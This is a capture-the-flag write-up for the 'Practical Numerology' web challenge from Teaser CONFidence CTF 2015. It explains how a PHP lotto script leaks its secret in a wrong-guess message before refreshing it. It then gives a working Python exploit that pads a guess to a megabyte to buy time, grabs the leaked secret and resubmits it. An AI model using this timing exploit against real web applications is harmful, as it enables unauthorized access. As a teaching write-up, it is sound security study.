# Teaser CONFidence CTF 2015: Practical Numerology

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| Teaser CONFidence CTF 2015 | Practical Numerology | Web |    300 |

**Description:**
>*Here's a [lotto script](challenge/index.php), running on my old and slow computer. Can you pwn it?*

----------
## Write-up
### First look

The lotto script effectively does the following:

* It checks if the session (handled in PHP using cookies) contains the 'secret' variable, if not it generates a new secret
* It checks if the POST variable 'guess' is set, if so it compares the guess against the stored secret and if it matches we get the flag
* If it does not match, the secret is displayed and gets refreshed

So essentially we get a single shot at guessing the secret right.

Given that the secrets are, for all intents and purposes, generated securely:

>```php
>function generate_secret()
>{
>    $f = fopen('/dev/urandom','rb');
>    $secret1 = fread($f,32);
>    $secret2 = fread($f,32);
>    fclose($f);
>    
>    return sha1($secret1).sha1($secret2);
>}
>```

We will have to either somehow prevent the secret from being refreshed or be quick enough to submit it before it gets refreshed. The former could be possible with a [HEAD request](https://rdot.org/forum/showthread.php?t=1330) which will halt script execution at first output hence not executing the secret-refreshing code. Since our guess has to be submitted as a POST variable, however, this is not an option.

Looking at the code, however, we do see that in the case of a wrong guess the guess attempt itself is output too (being processed by htmlspecialchars first):

>```php
>echo "Wrong! '{$_SESSION['secret']}' != '";
>echo htmlspecialchars($guess);
>echo "'";
>
>$_SESSION['secret'] = generate_secret();
>```

Hence, if we make a request with a very large guess, we can buy ourselves some time between the display of the secret and its refreshing. So our exploit will consist of creating a session, making a very large guess, extracting the secret from the response and immediately closing the connection (since we can only have one connection per session) and submit the secret:

>```python
>#!/usr/bin/python
>#
># Teaser CONFidence CTF 2015
># Practical numerology (WEB/300)
>#
># @a: Smoke Leet Everyday
># @u: https://github.com/smokeleeteveryday
>#
>
>import socket
>import re
>
>url = '134.213.136.172'
>data = 'guess='
>
>payload1 = 'GET / HTTP/1.1\r\n'
>payload1 += 'Host: 134.213.136.172\r\n\r\n'
>
>payload2 = "POST / HTTP/1.1\r\n"
>payload2 += "Host: 134.213.136.172\r\n"
>payload2 += "Cookie: PHPSESSID={}\r\n"
>payload2 += "Content-Length: {}\r\n"
>payload2 += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
>payload2 += "{}"
>
>s = socket.create_connection((url, 80))
>s.send(payload1)
>cookie = re.findall('PHPSESSID=(.*);', s.recv(1500))[0]
>s.close()
>
>s = socket.create_connection((url, 80))
>guess = data + 'A'*1000000
>s.send(payload2.format(cookie, len(guess), guess))
>secret = re.findall("'(.*)' !=", s.recv(500))[0]
>s.close()
>
>s = socket.create_connection((url, 80))
>guess = data + secret
>s.send(payload2.format(cookie, len(guess), guess))
>print s.recv(2000).splitlines()[-1]
>s.close()
>```

Which produces the following output:

>```bash
>$ ./practicalnum_sploit.py 
>Lucky bastard! You won the flag! DrgnS{JustThinkOutOfTheBoxSometimes...}
>```